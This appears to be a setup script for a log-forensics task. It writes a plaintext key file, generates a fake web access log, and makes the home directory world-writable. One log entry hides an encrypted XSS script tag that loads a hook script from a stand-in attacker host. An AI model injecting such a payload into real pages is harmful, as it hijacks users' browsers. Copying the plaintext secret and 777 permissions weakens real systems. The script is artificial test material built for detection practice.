#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip openssl
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    echo -n "V3ryS3cur3K3y2024" > /home/user/secret.key

    PAYLOAD=$(echo -n '<script src="https://xss.evil-hacker.local/hook.js"></script>' | openssl enc -aes-256-cbc -pbkdf2 -pass pass:V3ryS3cur3K3y2024 -base64 | tr -d '\n')

    cat <<EOF > /home/user/traffic.log
192.168.1.10 - - [10/Oct/2023:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 1043
198.51.100.23 - - [10/Oct/2023:13:56:01 -0700] "GET /about.html HTTP/1.1" 200 854
203.0.113.99 - - [10/Oct/2023:13:58:11 -0700] "GET /api/data?token=$PAYLOAD HTTP/1.1" 200 432
10.0.0.5 - - [10/Oct/2023:14:01:22 -0700] "POST /login HTTP/1.1" 401 120
EOF

    chmod -R 777 /home/user
